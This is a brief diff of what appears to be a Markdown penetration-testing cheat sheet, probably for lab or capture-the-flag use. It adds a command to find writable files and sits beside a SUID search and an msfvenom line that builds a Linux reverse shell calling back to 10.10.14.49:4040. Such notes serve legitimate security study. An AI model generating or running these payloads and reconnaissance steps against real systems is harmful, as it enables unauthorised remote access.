@@ -23,6 +23,11 @@ OR
 find / -perm +6000 2>/dev/null | grep '/bin/'
 ```
 ___
+`Find Writable files / folders`
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+```
+___
 `MsfVenom`
 ```
 In Attackers pc: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=4040 -f elf > r.elf
